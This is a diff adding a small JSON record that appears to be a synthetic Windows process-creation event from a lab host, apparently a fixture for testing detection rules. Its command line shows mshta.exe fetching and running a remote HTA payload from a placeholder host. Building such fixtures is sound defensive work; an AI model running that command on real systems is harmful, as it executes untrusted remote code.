@@ -1,0 +1,9 @@
+{
+  "EventID": 4688,
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "CommandLine": "mshta.exe https://example.invalid/payload.hta",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "User": "LAB\\test-user",
+  "Computer": "WIN11-LAB",
+  "TimeCreated": "2026-08-24T14:00:00Z"
+}
